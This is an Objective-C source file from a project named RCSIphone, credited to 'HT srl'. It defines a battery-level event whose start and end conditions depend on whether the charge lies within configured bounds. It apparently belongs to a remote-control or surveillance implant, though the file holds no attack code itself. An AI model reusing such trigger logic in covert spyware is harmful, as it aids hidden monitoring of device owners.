//
//  RCSIEventBattery.m
//  RCSIphone
//
//  Created by kiodo on 02/03/12.
//  Copyright 2012 HT srl. All rights reserved.
//

#import "RCSIEventBattery.h"
#import "RCSICommon.h"

@implementation _i_EventBattery

@synthesize minLevel;
@synthesize maxLevel;

- (id)init
{
  self = [super init];
  if (self) 
    {
    eventType = EVENT_BATTERY;
    }
  
  return self;
}

- (BOOL)readyToTriggerStart
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  BOOL bRet = FALSE;
  UIDevice  *uiDev = [UIDevice currentDevice];
  
  if ([uiDev isBatteryMonitoringEnabled] == FALSE)
    uiDev.batteryMonitoringEnabled = TRUE;
  
  float battLevel = [uiDev batteryLevel] * 100;
  
  [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.300]];
  
  if (minLevel <= battLevel &&  battLevel <= maxLevel) 
    {
      bRet = TRUE;
    }
   
  [pool release];
  
  return bRet; 
}

- (BOOL)readyToTriggerEnd
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  BOOL bRet = FALSE;
  UIDevice  *uiDev = [UIDevice currentDevice];
  
  if ([uiDev isBatteryMonitoringEnabled] == FALSE)
    uiDev.batteryMonitoringEnabled = TRUE;
  
  float battLevel = [uiDev batteryLevel] * 100;
  
  [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.300]];
  
  if (minLevel > battLevel ||  battLevel > maxLevel) 
    {
      bRet = TRUE;
    }
  
  [pool release];
  
  return bRet;
}

@end
